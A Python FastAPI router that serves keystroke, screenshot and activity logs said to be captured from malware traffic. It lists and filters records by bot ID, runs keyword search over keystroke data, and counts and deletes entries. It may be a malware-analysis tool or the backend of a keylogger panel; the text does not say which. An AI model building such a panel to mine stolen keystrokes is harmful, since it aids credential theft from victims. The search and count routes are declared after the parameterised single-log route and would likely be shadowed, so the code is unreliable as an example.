"""
Keystroke and activity log API endpoints.

Provides REST endpoints for querying captured keystrokes, screenshots,
and other activity logs from malware traffic.
"""

from typing import List, Optional

from fastapi import APIRouter, Depends, Query
from sqlalchemy import desc, select
from sqlalchemy.ext.asyncio import AsyncSession

from app.core.database import get_db
from app.core.logging import get_logger
from app.models.log import Log, LogRead

logger = get_logger(__name__)

router = APIRouter()


@router.get("/logs", response_model=List[LogRead])
async def list_logs(
    bot_id: Optional[int] = Query(None, description="Filter by bot ID"),
    log_type: Optional[str] = Query(None, description="Filter by log type"),
    window_title: Optional[str] = Query(None, description="Search window title"),
    limit: int = Query(100, ge=1, le=1000, description="Maximum number of results"),
    offset: int = Query(0, ge=0, description="Offset for pagination"),
    db: AsyncSession = Depends(get_db),
):
    """
    List captured logs with optional filtering.
    
    Returns paginated logs ordered by received_at (most recent first).
    """
    query = select(Log).order_by(desc(Log.received_at))
    
    # Apply filters
    if bot_id is not None:
        query = query.where(Log.bot_id == bot_id)
    if log_type:
        query = query.where(Log.log_type == log_type)
    if window_title:
        query = query.where(Log.window_title.ilike(f"%{window_title}%"))
    
    # Apply pagination
    query = query.limit(limit).offset(offset)
    
    result = await db.execute(query)
    logs = result.scalars().all()
    
    logger.info(f"Retrieved {len(logs)} logs (bot_id={bot_id}, type={log_type})")
    
    return logs


@router.get("/logs/{log_id}", response_model=LogRead)
async def get_log(
    log_id: int,
    db: AsyncSession = Depends(get_db),
):
    """
    Get detailed information about a specific log entry.
    """
    result = await db.execute(select(Log).where(Log.id == log_id))
    log = result.scalar_one_or_none()
    
    if not log:
        from fastapi import HTTPException
        raise HTTPException(status_code=404, detail=f"Log {log_id} not found")
    
    return log


@router.get("/logs/search")
async def search_logs(
    keyword: str = Query(..., min_length=3, description="Search keyword in keystrokes"),
    limit: int = Query(50, ge=1, le=500),
    db: AsyncSession = Depends(get_db),
):
    """
    Full-text search in keystroke data.
    
    Searches for keywords in captured keystrokes and window titles.
    """
    query = select(Log).where(
        (Log.keystroke_data.ilike(f"%{keyword}%")) |
        (Log.window_title.ilike(f"%{keyword}%"))
    ).order_by(desc(Log.received_at)).limit(limit)
    
    result = await db.execute(query)
    logs = result.scalars().all()
    
    logger.info(f"Search for '{keyword}' returned {len(logs)} results")
    
    return logs


@router.get("/logs/count")
async def count_logs(
    bot_id: Optional[int] = Query(None),
    log_type: Optional[str] = Query(None),
    db: AsyncSession = Depends(get_db),
):
    """
    Get total count of logs, optionally filtered.
    """
    from sqlalchemy import func
    
    query = select(func.count(Log.id))
    
    if bot_id is not None:
        query = query.where(Log.bot_id == bot_id)
    if log_type:
        query = query.where(Log.log_type == log_type)
    
    result = await db.execute(query)
    count = result.scalar()
    
    return {"count": count, "bot_id": bot_id, "log_type": log_type}


@router.delete("/logs/{log_id}")
async def delete_log(
    log_id: int,
    db: AsyncSession = Depends(get_db),
):
    """
    Delete a specific log entry.
    """
    result = await db.execute(select(Log).where(Log.id == log_id))
    log = result.scalar_one_or_none()
    
    if not log:
        from fastapi import HTTPException
        raise HTTPException(status_code=404, detail=f"Log {log_id} not found")
    
    from sqlalchemy import delete as sql_delete
    await db.execute(sql_delete(Log).where(Log.id == log_id))
    await db.commit()
    
    logger.info(f"Deleted log {log_id}")
    
    return {"status": "deleted", "log_id": log_id}
